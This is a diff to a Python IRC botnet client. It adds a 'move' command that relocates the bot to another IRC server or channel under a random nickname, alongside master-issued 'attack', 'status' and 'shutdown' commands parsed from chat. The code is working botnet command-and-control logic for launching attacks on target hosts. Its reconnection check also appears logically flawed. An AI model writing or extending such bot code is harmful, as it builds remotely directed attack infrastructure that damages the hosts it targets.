@@ -78,12 +78,42 @@ def attack(masterName, hostname,port):
         print(err)
     return
 #use to move
-def move(masterName,hostname,port,channel):
+def move(hostname1,port1,channel1):
+    global irc
+    while True:
+        # if not the same server connect
+        if hostname1 != hostname and port1 != port:
+            botname = "bot"+str(random.randint(0,999999))
+            irc.connect((hostname1, port1))
+            msg = "NICK " + botname + "\r\n"
+            irc.send(msg.encode())
+            msg = "USER "+botname+" * * : bot " + botname +"\r\n"
+            irc.send(msg.encode())
+            indata = irc.recv(1024)
+            inmsg = indata.decode("utf-8").split("\r\n")
+            state_code=inmsg[0].split()[1]
+            # wait 5s before retrying to coneect
+            if state_code != "001":
+                time.sleep(5)
+                continue
+        else:
+            #disconnect from current channel
+            msg = "PART #"+channel+"\r\n"
+            irc.send(msg.encode())
+
+        if joinChannel(channel1):
+            break
+
+
     return
 # use the listen to chat
 def listen():
     global atkCounter
+    global hostname
+    global port
+    global channel
     while True:
+
         indata = irc.recv(1024)
         inmsg = indata.decode("utf-8").split()
         print(inmsg)
@@ -101,11 +131,13 @@ def listen():
                 if inCmd == 'attack':
                     attack(masterName,inmsg[5],int(inmsg[6]))
                     atkCounter += 1
-                    print(atkCounter)
                 elif inCmd == 'status':
                     status(masterName)
                 elif inCmd == 'move':
-                    move(masterName,inmsg[5],int(inmsg[6]),inmsg[7])
+                    move(inmsg[5],int(inmsg[6]),inmsg[7])
+                    hostname = inmsg[5]
+                    port = int(inmsg[6])
+                    channel = inmsg[7]
                 elif inCmd == 'shutdown':
                     shutdown()
 
